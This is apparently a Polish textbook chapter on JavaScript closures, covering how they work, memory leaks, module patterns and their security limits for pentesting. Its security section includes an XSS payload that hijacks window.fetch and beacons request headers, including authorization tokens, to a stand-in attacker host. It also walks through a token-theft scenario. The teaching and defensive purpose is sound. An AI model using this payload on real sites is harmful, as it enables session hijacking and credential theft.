# Rozdział 5: Closures

## 1. Czym jest Closure

**Closure** (domknięcie) to funkcja, która "zapamiętuje" Lexical Environment (środowisko leksykalne) ze swojego miejsca definicji — nawet jeśli jest wywoływana w zupełnie innym miejscu lub po tym, jak zewnętrzna funkcja już zakończyła działanie.

Formalnie: closure to połączenie funkcji i jej Lexical Environment (zestawu zmiennych dostępnych w momencie tworzenia funkcji).

Closure nie jest cechą, którą musisz "włączyć" — w JavaScript *każda* funkcja jest closure. Za każdym razem gdy tworzysz funkcję, przechowuje ona referencję do swojego Lexical Environment.

### Gdzie istnieje

Closure istnieje w silniku JavaScript jako para:
1. Obiekt funkcji (Function Object) — kod do wykonania
2. Referencja do Lexical Environment — gdzie szukać zmiennych

Closure jest częścią specyfikacji ECMAScript.

### Kiedy ma znaczenie

Closure "robi różnicę" gdy funkcja wewnętrzna outlives (przeżywa) funkcję zewnętrzną:

```javascript
function outer() {
    let x = 10; // zmienna w outer
    
    return function inner() { // inner "zamknął" x
        console.log(x); // x żyje, bo inner na nie wskazuje
    };
}

const fn = outer(); // outer zakończył, ale x jeszcze żyje!
fn(); // 10 — x nadal dostępny przez closure
```

Gdyby nie closure, `x` zostałoby zniszczone gdy `outer()` zakończy działanie. Closure "trzyma" zmienną przy życiu.

---

## 2. Dlaczego powstał

### Problem: stan prywatny w JavaScript

JavaScript nie ma (do ES2022) prywatnych pól klas w sensie językowym (choć `#field` je dodaje). Historycznie closure było jedynym sposobem na ukrycie stanu — tworzenie "prywatnych" zmiennych, do których dostęp jest kontrolowany przez funkcje.

### Problem: funkcje z pamięcią

Bez closure każde wywołanie funkcji zaczyna od zera — żadnej pamięci między wywołaniami bez zmiennych globalnych. Closure pozwala funkcji "pamiętać" stan między wywołaniami.

### Asynchroniczność i callbacki

Closure jest fundamentalne dla asynchronicznego programowania. Callback wywołany po 5 sekundach "pamięta" kontekst w którym był stworzony:

```javascript
function startCountdown(seconds) {
    let remaining = seconds;
    
    const interval = setInterval(() => {
        remaining--; // closure na 'remaining'
        console.log(remaining);
        if (remaining <= 0) clearInterval(interval);
    }, 1000);
}

startCountdown(5); // callback pamięta 'remaining' przez 5 sekund
```

---

## 3. Jak działa

### Mechanizm krok po kroku

```
1. Definicja funkcji wewnętrznej
        │
        ▼
2. Silnik tworzy Function Object
        │
        ├── code: ciało funkcji
        └── [[Environment]]: referencja do bieżącego Lexical Environment
                │
                ▼
3. Gdy zewnętrzna funkcja kończy działanie:
   - Jej EC jest zdejmowany z Call Stack
   - Jej Lexical Environment NIE jest niszczony (jest referencja z closure)
   - GC nie usuwa LE dopóki istnieje referencja
```

### Diagram pamięci

```
Heap (pamięć dynamiczna):

┌─────────────────────────────────────────────────────┐
│  Function Object (inner)                            │
│  ┌──────────────┐     ┌──────────────────────────┐ │
│  │ code: ...    │     │ [[Environment]] ──────────┼─┼──►  Lexical Env (outer)
│  └──────────────┘     └──────────────────────────┘ │      ┌────────────────┐
│                                                     │      │ x: 10          │
└─────────────────────────────────────────────────────┘      │ outer: [Env]──►│ Global LE
                                                             └────────────────┘
```

### Współdzielona referencja — nie kopia

Closure przechowuje *referencję* do Lexical Environment, nie kopię wartości. Zmiany zmiennej są widoczne przez closure:

```javascript
function makeCounter() {
    let count = 0; // jedna zmienna w LE
    
    return {
        increment() { count++; },   // referencja do count
        decrement() { count--; },   // referencja do tego samego count
        getCount()  { return count; } // referencja do tego samego count
    };
}

const counter = makeCounter();
counter.increment();
counter.increment();
counter.increment();
console.log(counter.getCount()); // 3
```

Wszystkie trzy funkcje (`increment`, `decrement`, `getCount`) współdzielą *jedno* Lexical Environment z *jedną* zmienną `count`.

### Closure a pętle — klasyczny pułapka

```javascript
// Problem z var:
const funcs = [];

for (var i = 0; i < 3; i++) {
    funcs.push(function() {
        console.log(i); // closure na i — ale i jest JEDNO dla całej pętli!
    });
}

funcs[0](); // 3 — nie 0!
funcs[1](); // 3
funcs[2](); // 3
// Po pętli i = 3, i wszystkie closures wskazują na to samo i

// Rozwiązanie 1: let (każda iteracja = osobny LE)
for (let i = 0; i < 3; i++) {
    funcs.push(() => console.log(i)); // osobne i dla każdej iteracji
}

// Rozwiązanie 2: IIFE (tworzenie nowego Lexical Environment)
for (var i = 0; i < 3; i++) {
    funcs.push((function(j) {
        return () => console.log(j); // j to kopia i dla tej iteracji
    })(i));
}
```

---

## 4. Co dzieje się wewnętrznie

### Function Object i [[Environment]]

W specyfikacji ECMAScript każda funkcja ma wewnętrzne pole `[[Environment]]` wskazujące na Lexical Environment w którym była stworzona. To jest właśnie closure.

Gdy funkcja jest wywoływana:
1. Tworzy nowy LE dla bieżącego wywołania
2. Ustawia `outer` tego LE na `[[Environment]]` funkcji
3. To tworzy Scope Chain: bieżący LE → LE closure → Global LE

### Garbage Collection i memory leaks

Closure może powodować wycieki pamięci jeśli przypadkowo zatrzymuje duże obiekty:

```javascript
function attachHandler() {
    const largeData = new Array(1000000).fill("data"); // 1MB danych
    
    document.getElementById("btn").addEventListener("click", function() {
        // Closure zatrzymuje largeData w pamięci dopóki event listener istnieje!
        console.log("clicked");
        // largeData nie jest używane, ale closure je "trzyma"
    });
}
```

GC nie może zwolnić `largeData` bo event listener ma closure wskazujące na LE które zawiera `largeData`.

**Naprawka:**
```javascript
function attachHandler() {
    const largeData = new Array(1000000).fill("data");
    const processed = processData(largeData); // przetwórz
    // largeData może być GC'd — closure closure tylko na processed
    
    document.getElementById("btn").addEventListener("click", function() {
        console.log(processed.summary); // closure tylko na processed
    });
}
```

### WeakRef i FinalizationRegistry (ES2021)

Nowoczesne API pozwala tworzyć "słabe" referencje, które nie blokują GC:

```javascript
const cache = new Map();

function processHeavyObject(obj) {
    const ref = new WeakRef(obj);
    
    return {
        getResult() {
            const o = ref.deref(); // może być undefined jeśli GC usunął
            if (!o) return null;
            return expensiveComputation(o);
        }
    };
}
```

---

## 5. Analogiczny przykład z życia

Wyobraź sobie skrzynkę pocztową z tajnym kodem:

- **Funkcja zewnętrzna (outer)** = właściciel skrzynki, który ustawił kod i dał klucz
- **Closure** = klucz dostępu do skrzynki
- **Funkcja wewnętrzna (inner)** = posłaniec, który ma klucz

Posłaniec (inner function) może odchodzić i wracać, być wywoływany w różnych miejscach — ale zawsze ma klucz (closure) i może otworzyć skrzynkę (dostęp do zmiennych outer), nawet jeśli właściciel (outer function) już nie żyje (funkcja zakończyła się).

Co więcej, jeśli właściciel dał klucze DWÓM posłańcom — obaj otwierają *tę samą* skrzynkę. Jeden list dodany przez posłańca A jest widoczny dla posłańca B.

---

## 6. Przykład kodu

```javascript
function createAuthGuard(requiredRole) {
    // 'requiredRole' jest w LE createAuthGuard
    
    // Wewnętrzna funkcja — closure na 'requiredRole'
    return function checkAccess(user) {
        // 'user' to parametr tej funkcji
        // 'requiredRole' z closure
        
        if (!user) {
            console.log("Brak użytkownika");
            return false;
        }
        
        if (!user.roles || !user.roles.includes(requiredRole)) {
            console.log(`Brak roli: ${requiredRole}`);
            return false;
        }
        
        return true;
    };
}

// Tworzenie strażników z różnymi wymaganiami
const requireAdmin = createAuthGuard("admin");
// createAuthGuard zakończył, ale 'requiredRole = "admin"' żyje przez closure

const requireModerator = createAuthGuard("moderator");
// Osobne LE — 'requiredRole = "moderator"'

// Użycie:
const testUser = { roles: ["admin", "user"] };
console.log(requireAdmin(testUser));     // true — ma 'admin'
console.log(requireModerator(testUser)); // false — nie ma 'moderator'
```

**Wyjaśnienie linijka po linijce:**

1. `createAuthGuard("admin")` — tworzy EC, `requiredRole = "admin"` w LE
2. Zwraca funkcję `checkAccess` z `[[Environment]]` wskazującym na LE (requiredRole = "admin")
3. EC `createAuthGuard` jest zdejmowany z Call Stack — ale LE zostaje bo `checkAccess` je trzyma
4. `requireAdmin = checkAccess` — teraz `requireAdmin` wskazuje na funkcję z closure
5. `requireAdmin(testUser)` — wywołuje `checkAccess`, szuka `requiredRole` w closure → "admin"

---

## 7. Przykład z prawdziwej aplikacji

### Memoization — buforowanie wyników

```javascript
// Closure przechowuje cache wewnątrz
function memoize(fn) {
    const cache = new Map(); // private cache przez closure
    
    return function(...args) {
        const key = JSON.stringify(args);
        
        if (cache.has(key)) {
            return cache.get(key); // zwróć z cache
        }
        
        const result = fn.apply(this, args);
        cache.set(key, result);
        return result;
    };
}

const expensiveCalc = memoize(function(n) {
    console.log(`Obliczam dla ${n}`);
    return n * n;
});

expensiveCalc(5); // "Obliczam dla 5", zwraca 25
expensiveCalc(5); // z cache, zwraca 25 (bez logowania)
```

### Module Pattern — hermetyzacja

```javascript
// Wzorzec popularny przed ES6 modules
const PaymentModule = (function() {
    // Prywatne przez IIFE closure
    const GATEWAY_KEY = "sk_live_..."; // nie dostępne z zewnątrz
    let transactionLog = [];
    
    function logTransaction(id, amount) {
        transactionLog.push({ id, amount, ts: Date.now() });
    }
    
    // Public API
    return {
        charge(amount, cardToken) {
            const txId = processPayment(cardToken, amount, GATEWAY_KEY);
            logTransaction(txId, amount);
            return txId;
        },
        
        getTransactionCount() {
            return transactionLog.length; // przez closure
        }
        
        // GATEWAY_KEY i transactionLog niedostępne z zewnątrz
    };
})();

PaymentModule.GATEWAY_KEY;         // undefined
PaymentModule.charge(100, "tok_"); // działa
```

### Event Handler z kontekstem

```javascript
// Framework budujący dynamiczne listy produktów
function createProductCard(product) {
    // product = { id, name, price } — w closure
    
    const card = document.createElement("div");
    card.innerHTML = `<h3>${product.name}</h3>`;
    
    // Każdy button ma closure na 'product' z tej iteracji
    const addToCartBtn = document.createElement("button");
    addToCartBtn.addEventListener("click", () => {
        // closure na product — nie trzeba przechowywać w data-attribute
        cart.add(product.id, product.name, product.price);
    });
    
    card.appendChild(addToCartBtn);
    return card;
}

products.forEach(product => {
    container.appendChild(createProductCard(product));
    // Każda karta ma własną closure na własny product
});
```

---

## 8. Typowe błędy programistów

### Błąd 1: Niezamierzone zatrzymanie dużych obiektów

```javascript
function setupWidget(config) {
    // config może być dużym obiektem z całym stanem aplikacji
    const element = config.element;
    
    element.addEventListener("resize", () => {
        // Closure na 'config' — cały duży obiekt żyje
        adjustSize(config.width, config.height); // używamy tylko dwóch pól!
    });
}

// Poprawka: wyciągnij tylko potrzebne dane
function setupWidget(config) {
    const { width, height, element } = config;
    // config może być GC'd
    
    element.addEventListener("resize", () => {
        adjustSize(width, height); // closure tylko na dwa prymitywy
    });
}
```

### Błąd 2: Circular references i memory leaks

```javascript
function attachHandler(element) {
    const handler = {
        element: element,  // handler wskazuje na element
        handle() {
            console.log(this.element); // closure/referencja na handler → element
        }
    };
    
    element.handler = handler; // element wskazuje na handler
    // Circular: element → handler → element
    // Może powodować wycieki w starych przeglądarkach
    
    element.addEventListener("click", handler.handle);
}

// Poprawka: usuń referencję gdy niepotrzebna
function detachHandler(element) {
    element.removeEventListener("click", element.handler.handle);
    element.handler = null; // przerwij circular reference
}
```

### Błąd 3: Stale closure (przestarzałe closure)

```javascript
// React — klasyczny bug ze starą wartością state w closure
function Counter() {
    const [count, setCount] = useState(0);
    
    useEffect(() => {
        const interval = setInterval(() => {
            // 'count' w closure to wartość z momentu tworzenia setInterval
            // Zawsze 0! — "stale closure"
            setCount(count + 1); // zawsze 0 + 1 = 1
        }, 1000);
        
        return () => clearInterval(interval);
    }, []); // [] = uruchom raz — closure na count=0
    
    // Poprawka: użyj functional update
    useEffect(() => {
        const interval = setInterval(() => {
            setCount(prev => prev + 1); // 'prev' zawsze aktualne
        }, 1000);
        
        return () => clearInterval(interval);
    }, []);
}
```

---

## 9. Znaczenie dla bezpieczeństwa

### Closure jako mechanizm ochrony

Closure jest jedynym sposobem na prawdziwie prywatne dane w JavaScript (do ES2022 private fields):

```javascript
function createSecureToken() {
    const _value = generateSecureRandom(); // prywatna
    
    return {
        verify(input) {
            return input === _value; // closure, ale nie ekspozycja
        }
        // _value niedostępna bezpośrednio
    };
}
```

Ale to tylko "security by encapsulation" — nie jest to kryptograficznie bezpieczne. XSS łamie tę ochronę.

### XSS + Closure = dostęp do prywatnych danych

Gdy atakujący osiągnie XSS:

```javascript
// Aplikacja ofiara
const auth = (function() {
    const sessionToken = "Bearer eyJhbGciOiJIUzI1NiJ9..."; // "prywatny"
    return {
        makeRequest(url) {
            return fetch(url, {
                headers: { Authorization: sessionToken }
            });
        }
    };
})();

// Payload XSS atakującego (wymaga XSS na tej samej stronie):
// Nie można odczytać sessionToken bezpośrednio
// ALE można przechwycić fetch:
const realFetch = window.fetch;
window.fetch = function(url, options) {
    // Przechwytuje każde wywołanie fetch — łącznie z tokenem
    navigator.sendBeacon("https://evil.com/log", JSON.stringify({
        url, headers: options?.headers
    }));
    return realFetch.apply(this, arguments);
};
// auth.makeRequest() wywoła interceptowany fetch i wyśle token
```

### Prototype Pollution przez Closure

Jeśli zewnętrzne Lexical Environment używa `Object.prototype` lub innych prototypów, polluted prototype może wpłynąć na closure:

```javascript
function makeConfig() {
    const defaults = {}; // {} dziedziczy po Object.prototype
    
    // Jeśli Object.prototype.isAdmin jest true (przez prototype pollution)
    return function(key) {
        return defaults[key]; // może zwracać polluted wartości
    };
}
```

### Stale Closure jako wektor

Przestarzałe closure mogą prowadzić do używania starych, nieaktualnych tokenów lub stanów bezpieczeństwa:

```javascript
function setupAuth() {
    let token = fetchToken(); // aktualny token
    
    // Token jest odświeżany co 30 minut
    setInterval(() => {
        token = fetchToken(); // aktualizuje zmienną
    }, 30 * 60 * 1000);
    
    return {
        getToken() { return token; } // closure — zawsze aktualne przez referencję
    };
}

// PROBLEM: jeśli token jest przekazywany przez wartość, nie referencję:
const cachedToken = setupAuth().getToken(); // kopia wartości, nie closure!
// cachedToken nigdy się nie aktualizuje!
```

### Powiązane CWE

- **CWE-672** — Operation on a Resource after Expiration or Release (stale closure)
- **CWE-1002** — Sensitive Function Use in Private Methods (ochrona przez closure może być złamana przez XSS)

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Sources → Scope → Closure

Podczas debugowania (breakpoint w funkcji z closure):

```
Panel Scope:
▼ Local
    this: Window
    args: ["user123"]
▼ Closure (createAuthGuard)
    requiredRole: "admin"       ← wartość zamknięta w closure!
▼ Global
    window: Window {...}
```

Kliknij w "Closure (functionName)" — zobaczysz wszystkie zmienne w tym Lexical Environment.

### Monkey-patching detection

```javascript
// Sprawdź czy ktoś nie zmodyfikował kluczowych funkcji
// (może wskazywać na XSS który już się wykonał)
console.log(fetch === window.fetch); // false → ktoś podmienił fetch!
console.log(XMLHttpRequest.prototype.send.toString()); // sprawdź czy nie zmodyfikowany
```

### Szukanie wrażliwych danych w closure

W DevTools Console podczas pauzy na breakpoincie:

```javascript
// Znajdź wszystkie closure scopes przez debugger
// Lub szukaj w Sources przez Ctrl+Shift+F:
// - wzorzec: const (token|key|secret|password|auth)
// - sprawdź czy są wewnątrz IIFE lub zwracanych funkcji
```

### Memory profiling — wykrywanie wycieków przez closure

DevTools → **Memory** → Take Heap Snapshot:
1. Zrób snapshot przed akcją
2. Wykonaj akcję (np. otwórz/zamknij modal 100 razy)
3. Zrób snapshot po akcji
4. Porównaj: `Objects allocated between snapshots`
5. Szukaj dużych obiektów trzymanych przez event listeners/closures

---

## 11. Jak testować bezpieczeństwo

```
□ Czy wrażliwe dane (tokeny, klucze, PII) są w closure dostępnych przez DevTools Scope?
□ Czy closure nie zatrzymuje dużych obiektów (wyciek pamięci)?
□ Czy stale closures mogą prowadzić do użycia przestarzałych tokenów/konfiguracji?
□ Czy event listenery są usuwane (removeEventListener) gdy komponenty są niszczone?
□ Czy po XSS atakujący może monkey-patch'ować fetch/XMLHttpRequest i przechwycić dane?
□ Czy closures z danymi sesji są dostępne po wylogowaniu (stale references)?
□ Czy memory profiler pokazuje rosnące zużycie przy normalnym użytkowaniu (closure leaks)?
□ Czy circular references między DOM elementami a closure powodują wycieki?
□ Czy prywatne dane w closure są rzeczywiście prywatne (nie eksponowane przez debug API)?
□ Czy closure używają zewnętrznych zmiennych przez referencję (może prowadzić do race conditions)?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: Przechwycenie tokenu przez monkey-patching

**Wymagania:** XSS w tym samym origin co aplikacja.

**Przebieg:**
1. Aplikacja przechowuje token autoryzacyjny w closure IIFE
2. Token jest używany w każdym wywołaniu `fetch()`
3. Atakujący wstrzykuje XSS i podmienia globalny `fetch`
4. Każde kolejne wywołanie `auth.makeRequest()` trafia do zainfekowanego `fetch`
5. Nagłówki z tokenem są eksfiltrowane do serwera atakującego

**Ograniczenia:** Wymaga XSS w tym samym origin. CSP z `connect-src` może blokować eksfiltrację.

**Wpływ:** Kradzież tokenów autoryzacyjnych, przejęcie sesji.

### Scenariusz 2: Stale Closure Security Bypass

**Wymagania:** Aplikacja używa closure do cache'owania stanu bezpieczeństwa.

**Przebieg:**
```javascript
// Aplikacja ofiara — closure cache'uje wynik sprawdzenia roli
const isAdmin = (function() {
    let _cached = null;
    return function() {
        if (_cached === null) {
            _cached = checkUserRole() === 'admin'; // pierwsze sprawdzenie
        }
        return _cached; // następne z cache
    };
})();
```

1. Użytkownik loguje się jako admin → `_cached = true`
2. Admin zmienia rolę użytkownika na 'user' w panelu
3. Aplikacja kliencka nadal ma `_cached = true` — nie odświeża
4. Użytkownik wykonuje operacje administracyjne pomimo zmiany roli

**Wpływ:** Eskalacja uprawnień przez client-side cache.

---

## 13. Jak się zabezpieczać

### Minimalizuj dane w closure

```javascript
// Źle: closure zatrzymuje cały obiekt konfiguracji
function createHandler(config) {
    return () => process(config); // cały config w closure
}

// Dobrze: wyciągnij tylko potrzebne wartości
function createHandler({ timeout, retries, endpoint }) {
    return () => process({ timeout, retries, endpoint });
    // config może być GC'd — closure tylko na 3 prymitywy
}
```

### Explicit cleanup dla event listeners

```javascript
class Component {
    constructor(element) {
        this.element = element;
        this._handler = this._onClick.bind(this); // zapisz referencję
        this.element.addEventListener("click", this._handler);
    }
    
    _onClick(event) {
        // logika
    }
    
    destroy() {
        // Zawsze usuwaj listenery!
        this.element.removeEventListener("click", this._handler);
        this.element = null; // przerwij referencję do DOM
    }
}
```

### Używaj ES2022 private fields zamiast closure dla enkapsulacji

```javascript
// Nowoczesne (ES2022) — prawdziwe prywatne pola
class SecureAuth {
    #token = null;       // prawdziwie prywatne — nie dostępne przez closure/prototype
    #sessionId = null;
    
    constructor(token, sessionId) {
        this.#token = token;
        this.#sessionId = sessionId;
    }
    
    makeRequest(url) {
        return fetch(url, {
            headers: { Authorization: this.#token }
        });
    }
    
    // #token i #sessionId niewidoczne poza klasą
    // nawet w DevTools — pojawiają się jako "#token" nie jako normalna właściwość
}
```

### Zawsze odświeżaj dane bezpieczeństwa z serwera

```javascript
// Nie polegaj na closure-cached stanie bezpieczeństwa
async function checkAccess(resource) {
    // Zawsze pytaj serwer — nie używaj client-side cache dla autoryzacji
    const response = await fetch(`/api/auth/check?resource=${resource}`);
    return response.ok;
    
    // Nie: return cachedPermissions[resource]
}
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. Closure = funkcja + referencja do Lexical Environment w którym była stworzona
2. Każda funkcja w JavaScript jest closure — to nie specjalna cecha, to fundament języka
3. Closure przechowuje *referencję*, nie kopię — zmiany zmiennej są widoczne przez closure
4. Closure może powodować wycieki pamięci jeśli zatrzymuje duże obiekty
5. XSS + Closure = atakujący może przechwycić "prywatne" dane przez monkey-patching

**Najczęstsze nieporozumienia:**

- "Closure tworzy kopię zmiennej" — NIE. Closure trzyma referencję do LE. Zmienna może być modyfikowana.
- "Dane w closure są bezpieczne przed XSS" — NIE. XSS wykonuje kod w tym samym kontekście — może podmienić globalne funkcje (fetch, XMLHttpRequest) i przechwycić dane.
- "IIFE gwarantuje prywatność" — gwarantuje izolację od globalnego scope. Nie gwarantuje bezpieczeństwa przy XSS.

---

## Jak rozpoznać w prawdziwej aplikacji

1. **DevTools → Sources → breakpoint w callbacku → Scope → "Closure (nazwaFunkcji)"** — widzisz zamknięte zmienne
2. **Memory profiler** → porównaj snapshoty przed/po akcjach → szukaj obiektów trzymanych przez listenery
3. **Console** → sprawdź czy globalne funkcje nie są podmienione: `fetch.toString()` → jeśli nie zawiera `[native code]` → monkey-patching!
4. **Sources → Ctrl+Shift+F** → szukaj IIFE: `(function()`, `(() =>` → co zawierają?

---

## Powiązania

```
Closures
    │
    ├──► Scope (Rozdział 4)
    │         Closure = funkcja przechowująca referencję do zewnętrznego Scope
    │
    ├──► Execution Context (Rozdział 2)
    │         Closure żyje przez referencję do Lexical Environment EC
    │
    ├──► Event Loop (Rozdział 8)
    │         Callbacki asynchroniczne to closures na swój kontekst
    │
    ├──► Service Workers (Rozdział 19)
    │         SW globalny scope to oddzielny kontekst — closures nie przechodzą
    │
    └──► XSS/DOM (Rozdział 9, 10)
                XSS daje dostęp do kontekstu w którym żyją closures
```
